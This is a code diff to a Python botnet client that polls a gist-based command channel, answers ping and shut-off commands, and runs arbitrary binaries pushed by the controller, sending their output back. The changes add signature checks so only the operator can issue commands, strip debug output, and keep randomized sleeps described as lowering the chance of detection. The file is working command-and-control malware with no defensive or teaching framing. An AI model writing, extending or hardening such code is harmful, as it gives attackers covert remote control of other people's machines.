@@ -1,19 +1,20 @@
 import base64
-import json
 import subprocess
 import threading
+import random
+import requests
 from queue import Empty
 from queue import Queue
-import random
 
-import requests
+from typing import List
 
 from channel import Channel
 from time import sleep
+from nacl.signing import VerifyKey
 
 
 class Bot:
-    def __init__(self, token: str, gist: str):
+    def __init__(self, token: str, gist: str, verify_key: str):
         self.channel = Channel(token, gist)
         self.unprocessed_commands = Queue()
         self.active = True
@@ -21,6 +22,8 @@ class Bot:
         self.ip = (
             requests.get("https://am.i.mullvad.net/ip").content.decode("utf-8").strip()
         )
+
+        self.verify_key = VerifyKey(base64.b64decode(verify_key.encode("utf-8")))
 
         self.wait_for_commands()
 
@@ -34,7 +37,6 @@ class Bot:
 
         while self.active:
             for command in self.channel.check_messages():
-                print(f"New command = {command.body}")
                 self.unprocessed_commands.put(command)
 
             # Randomized sleep for a lesser chance of detection
@@ -55,26 +57,26 @@ class Bot:
             response_id = f"[]({base64.b64encode(f'{current_command.id}-{self.ip}'.encode('utf-8')).decode('utf-8')})"
             ip_b64 = base64.b64encode(self.ip.encode("utf-8")).decode("utf-8")
 
-            print(f"Processing command = {current_command.body}")
-
             # PING
-            if Channel.PING_REQUEST in current_command.body:
+            if Channel.PING_REQUEST in current_command.body and self.verify_signature(
+                current_command.body
+            ):
                 self.channel.send_message(f"{Channel.PING_RESPONSE} {response_id}")
 
             # SHUT OFF
             elif (
                 Channel.SHUT_OFF_REQUEST in current_command.body
                 and ip_b64 in current_command.body
+                and self.verify_signature(current_command.body)
             ):
-                self.channel.send_message(
-                    f"{Channel.SHUT_OFF_RESPONSE} " f"{response_id}"
-                )
+                self.channel.send_message(f"{Channel.SHUT_OFF_RESPONSE} {response_id}")
                 self.active = False
 
             # ARBITRARY BINARY
             elif (
                 Channel.BINARY_REQUEST in current_command.body
                 and ip_b64 in current_command.body
+                and self.verify_signature(current_command.body)
             ):
                 command = (
                     base64.b64decode(
@@ -92,7 +94,7 @@ class Bot:
 
             self.unprocessed_commands.task_done()
 
-    def execute_binary(self, args: list[str], response_header: str, response_id: str):
+    def execute_binary(self, args: List[str], response_header: str, response_id: str):
         """
         Executes a binary on the system
         :param args: Args including the name of the binary
@@ -106,3 +108,20 @@ class Bot:
             f"[]({base64.b64encode(process.stderr).decode('utf-8')})"
             f"{response_id}"
         )
+
+    def verify_signature(self, command: str) -> bool:
+        signature_split = command.split("_")
+
+        if len(signature_split) != 3:
+            return False
+
+        command = signature_split[0][:-4].encode("utf-8")
+        signature = base64.b64decode(signature_split[1].encode("utf-8"))
+
+        try:
+            self.verify_key.verify(command, signature)
+        except Exception:
+            print("Failed to verify the command.")
+            return False
+
+        return True
